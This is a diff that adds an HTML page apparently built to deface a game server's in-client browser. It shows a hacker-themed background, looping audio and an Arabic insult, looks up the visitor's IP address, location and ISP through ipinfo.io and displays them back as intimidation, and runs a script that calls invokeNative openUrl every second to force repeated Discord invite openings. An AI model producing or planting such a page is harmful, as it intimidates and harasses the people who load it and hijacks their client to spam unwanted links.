@@ -1,0 +1,89 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>https://discord.gg/t101</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('https://cdn.discordapp.com/attachments/1401231921433804914/1401585837040472145/anonymous-mask.1920x1080.gif?ex=6890d007&is=688f7e87&hm=e50ac918649996e1eadebd639ced9a7f455ea9fb0bae8d30f9265e9cb8027098&') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Courier New', Courier, monospace;
+            color: #FF0000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+        .image-container img {
+            width: 750px; 
+            height: auto;
+            border: 2px solid #FF0000; 
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.8); 
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #FF0000; 
+            text-shadow: 0px 0px 8px #FF0000, 0px 0px 15px #FF0000, 0px 0px 25px #FF0000; 
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
+        }
+        .text {
+            margin-top: 20px;
+            font-size: 3em; 
+            color: #FF0000; 
+            text-shadow: 0px 0px 8px #FF0000, 0px 0px 15px #FF0000, 0px 0px 25px #FF0000; 
+            letter-spacing: 4.5px; 
+        }
+    </style>
+</head>
+<body>
+    <div class="image-container">
+        <img src="https://cdn.discordapp.com/attachments/1401231921433804914/1401645167504789686/01950634-215B-41FA-A29C-7DA3336AA4BF.png?ex=68910749&is=688fb5c9&hm=2b4eec36a6e29fa31f7c2d51d1c3f55277a4386e15f61e3aff80c0ae64ebb6cb&" alt="Discord Image">
+    </div>
+    <audio autoplay loop>
+        <source src="https://cdn.discordapp.com/attachments/1390882671223115786/1401642436127625357/3905be207137a67f.mp3?ex=689104be&is=688fb33e&hm=dbd053ec6ac485d8e2d554f93d4a11eeb428d122aa8e08a25d5adcaddc0b0702&" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+   <div class="info" id="ip-info">
+        <strong>IP: <span id="ip"></span></strong><br>
+        <span><strong>City:</strong> <span id="city"></span></span><br>
+        <span><strong>Region:</strong> <span id="region"></span></span><br>
+        <span><strong>Country:</strong> <span id="country"></span></span><br>
+        <span><strong>Location:</strong> <span id="loc"></span></span><br>
+        <span><strong>Organization:</strong> <span id="org"></span></span><br>
+        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
+    </div>
+    <div class="text"> كس اخت دمار عاخت انس
+
+
+</div>
+
+    <script>
+         fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            delete data.readme;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.textContent = JSON.stringify(data, null, 2);
+        });
+    </script>
+
+<script>
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/T101");
+window.invokeNative("openUrl", "https://discord.gg/T101");
+window.invokeNative("openUrl", "https://discord.gg/32");
+window.invokeNative("openUrl", "https://discord.gg/32");
+}, 1000);
+    </script>
+</body>
+</html>
